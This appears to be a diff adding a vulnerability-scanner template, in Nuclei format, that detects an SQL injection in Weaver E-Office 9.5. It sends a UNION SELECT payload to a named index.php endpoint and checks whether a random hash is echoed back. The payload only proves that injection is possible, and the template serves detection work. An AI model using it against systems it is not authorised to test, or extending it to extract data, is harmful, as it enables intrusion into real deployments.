@@ -1,0 +1,24 @@
+id: poc-yaml-weaver-e-office-index-php-sqli
+info:
+  name: 泛微E-Office 9.5 index.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,e-office
+  description: |
+    This template detects an SQL injection vulnerability in 泛微E-Office 9.5 index.php.
+variables:
+  t1: "{{rand_int(100,10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: POST
+    path:
+      - "/E-mobile/App/System/UserSelect/index.php?m=getUserLists&privId=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT({{t2}})--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
